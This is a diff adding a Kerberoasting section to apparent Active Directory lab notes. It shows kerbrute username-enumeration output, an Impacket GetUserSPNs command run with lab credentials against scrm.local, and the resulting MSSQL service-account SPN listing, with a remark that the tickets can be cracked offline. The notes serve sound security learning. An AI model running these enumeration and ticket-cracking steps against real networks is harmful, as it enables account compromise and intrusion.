@@ -28,3 +28,20 @@ Version: dev (n/a) - 02/08/23 - Ronnie Flathers @ropnop
 2023/02/08 14:30:32 >  [+] VALID USERNAME:       sagi@MCDONALDS.LOCAL
 2023/02/08 14:31:49 >  [+] VALID USERNAME:       ido@MCDONALDS.LOCAL
 2023/02/08 14:48:58 >  [+] VALID USERNAME:       overlord@MCDONALDS.LOCAL
+```
+
+# SPNs
+
+If a user account has an SPN, we can request a service ticket on behalf of it, and crack it offline.
+
+```
+python GetUserSPNs.py -k scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -target-domain scrm.local -dc-host dc1.scrm.local
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[-] CCache file is not found. Skipping...
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
+MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
+```
